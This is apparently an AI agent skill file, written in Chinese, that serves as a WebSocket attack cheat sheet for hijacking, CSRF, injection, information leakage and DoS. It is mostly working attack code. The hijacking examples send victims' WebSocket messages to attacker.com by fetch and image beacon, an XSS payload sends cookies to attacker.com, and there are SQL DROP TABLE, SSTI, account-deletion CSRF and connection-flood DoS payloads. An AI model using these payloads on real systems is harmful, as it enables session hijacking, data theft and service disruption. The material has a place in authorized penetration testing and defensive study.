---
name: websocket攻击
description: Use when encountering websocket安全漏洞 - 跨站劫持、csrf、注入、dos
---

# WebSocket攻击

## Info

- **Domain**: web
- **Tags**: web, websocket, hijacking, injection

# WebSocket安全攻击

## 攻击思路
```
发现WebSocket端点 → Origin验证测试 → 连接劫持/消息注入 → 数据窃取/恶意操作
```

## WebSocket连接测试

```javascript
// 基础连接
var ws = new WebSocket('ws://target.com/ws');
ws.onopen = function() { console.log('连接成功'); ws.send('test'); };
ws.onmessage = function(e) { console.log(e.data); };
ws.onerror = function(e) { console.log('错误', e); };
```

```bash
# 命令行测试
wscat -c ws://target.com/ws
wscat -c wss://target.com/ws -H "Authorization: Bearer token"
```

## 跨站WebSocket劫持(CSWSH)

| 条件 | 原理 | 攻击效果 |
|------|------|----------|
| Origin未验证 | 任意页面可连接 | 窃取所有消息 |
| Origin白名单不严格 | 可伪造Origin | 绕过限制 |

```javascript
// 恶意页面劫持
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(e) {
  // 窃取敏感数据
  fetch('https://attacker.com/log?data=' + encodeURIComponent(e.data));
};
```

```html
<!-- 攻击页面 -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(e) {
  new Image().src = 'https://attacker.com/steal?d=' + encodeURIComponent(e.data);
};
</script>
```

## WebSocket CSRF攻击

```javascript
// 自动发送恶意操作
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  // 删除数据/转账/修改配置等敏感操作
  ws.send(JSON.stringify({
    action: 'delete_account',
    user_id: 12345
  }));
};
```

## 消息注入攻击矩阵

| 注入类型 | Payload | 效果 |
|----------|---------|------|
| XSS | <script>alert(1)</script> | 消息渲染触发 |
| SQL | '; DROP TABLE users;-- | 消息存储注入 |
| SSTI | {{7*7}} / {{config}} | 模板解析触发 |
| JSON | {"name":"admin","role":"admin"} | 权限提升 |

```javascript
// XSS注入测试
ws.send('<img src=x onerror=alert(1)>');
ws.send('<script>document.location="http://attacker.com/"+document.cookie</script>');

// SQL注入测试
ws.send("'; SELECT * FROM users WHERE '1'='1");
```

## 信息泄露攻击

```javascript
// 消息类型枚举
ws.send(JSON.stringify({type: 'getUsers'}));
ws.send(JSON.stringify({type: 'getConfig'}));
ws.send(JSON.stringify({type: 'getSecrets'}));

// 监听响应
ws.onmessage = function(e) {
  console.log('泄露数据:', e.data);
};
```

## DoS攻击

| DoS类型 | Payload | 效果 |
|---------|---------|------|
| 快速消息 | 高频发送大数据 | 消耗服务器资源 |
| 连接泛洪 | 建立大量连接 | 连接池耗尽 |
| 大消息 | 发送超大消息 | 内存溢出 |

```javascript
// 快速消息DoS
setInterval(() => ws.send('x'.repeat(100000)), 1);

// 连接泛洪
for(let i=0; i<1000; i++) {
  new WebSocket('wss://target.com/ws');
}
```

## 常见漏洞检测

| 检测项 | 方法 | 风险 |
|--------|------|------|
| Origin验证 | 恶意Origin连接测试 | CSWSH |
| Token验证 | 无Token连接测试 | 未授权访问 |
| 消息过滤 | 特殊字符发送测试 | XSS/SQL注入 |
| 速率限制 | 高频发送测试 | DoS |
| 认证绕过 | 移除认证连接 | 信息泄露 |

```bash
# Origin绕过测试
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# 无认证测试
wscat -c wss://target.com/ws
```